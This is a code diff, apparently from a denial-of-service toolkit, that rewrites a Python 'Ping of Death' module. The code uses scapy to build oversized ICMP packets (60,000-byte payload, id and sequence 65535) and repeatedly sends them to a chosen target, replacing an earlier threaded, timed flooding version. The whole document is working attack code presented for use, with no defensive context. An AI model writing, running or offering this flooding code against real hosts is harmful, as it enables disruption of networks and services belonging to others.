@@ -1,43 +1,19 @@
+
+# Import modules
 import random
-import time
-from scapy.all import IP, ICMP, sendp, send, fragment, conf
-from threading import Thread
-# Import modules for POD flood
-import tools.randomData as randomData
+from scapy.all import IP, ICMP, send, fragment
+from  colorama import Fore
 
-def POD_ATTACK(threads, attack_time, target):
-	# Finish
-	global FINISH
-	FINISH = False
+__letters = list("1234567890qwertyuiopasdfghjklzxcvbnm")
 
-	target_ip = target
+def flood(target):
+    payload = random.choice(__letters) * 60000
+    packet = IP(dst=target[0]) / ICMP(id=65535, seq=65535) / payload
 
-	print("[#] Attack started for " + str(attack_time) + " secounds..")
-	
-	threads_list = []
-
-	# POD flood
-	def pod_flood():
-		global FINISH
-		payload = random.choice(list("1234567890qwertyuiopasdfghjklzxcvbnm")) * 60000
-		packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload
-
-		while not FINISH:
-			for i in range(16):
-				send(packet, verbose = False)
-				print("[+] 60k bytes send..")
-
-	# Start threads
-	for thread in range(0, threads):
-		print("[#] Staring thread " + str(thread))
-		t = Thread(target = pod_flood)
-		t.start()
-		threads_list.append(t)
-	# Sleep selected secounds
-	time.sleep(attack_time)
-	# Terminate threads
-	for thread in threads_list:
-		FINISH = True
-		thread.join()
-	
-	print("[!] Ping of Death attack stopped!")
+    for i in range(16):
+        try:
+            send(packet, verbose=False)
+        except Exception as e:
+            print(f"{Fore.MAGENTA}Error while sending 'Ping Of Death'\n{Fore.MAGENTA}{e}{Fore.RESET}")
+        else:
+            print(f"{Fore.GREEN}[+] {Fore.YELLOW}65535 bytes send to {target[0]} {Fore.RESET}")
